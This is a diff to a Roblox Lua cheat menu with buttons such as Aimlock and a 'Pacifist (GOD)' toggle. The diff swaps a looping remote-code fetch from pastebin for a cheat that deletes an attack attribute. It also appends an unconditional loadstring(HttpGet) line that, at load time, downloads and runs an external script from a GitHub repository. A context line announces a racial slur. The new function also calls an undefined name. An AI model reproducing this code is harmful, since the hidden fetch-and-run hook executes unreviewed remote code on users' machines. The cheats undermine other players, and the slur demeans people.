@@ -828,7 +828,7 @@ SwagUsers.BorderSizePixel = 0
 SwagUsers.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
 SwagUsers.Size = UDim2.new(0, 94, 0, 46)
 SwagUsers.Font = Enum.Font.GothamBlack
-SwagUsers.Text = "Exploit Users"
+SwagUsers.Text = "Pacifist (GOD)"
 SwagUsers.TextColor3 = Color3.fromRGB(255, 255, 255)
 SwagUsers.TextSize = 14.000
 
@@ -2805,10 +2805,7 @@ Stamina.MouseButton1Click:Connect(function()
 end)
 
 SwagUsers.MouseButton1Click:Connect(function()
-while true do
-loadstring(game:HttpGet('https://pastebin.com/raw/RcXbn43F'))()
-wait(10)
-end
+local a=game:GetService"Players".LocalPlayer;function l()local b=a.Character:FindFirstChild"BodyEffects".Attacking;if b then b:Destroy()end end;l()a.CharacterAdded:Connect(function()wait(1)b()end)
 end)
 
 Aimlock.MouseButton1Click:Connect(function()
@@ -4322,4 +4319,5 @@ else
     announce('Commands Loaded', 'fuck niggers', 10)
 end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/null-federal/gayx/main/tagcheck.lua'))()
 if err then print(err) end
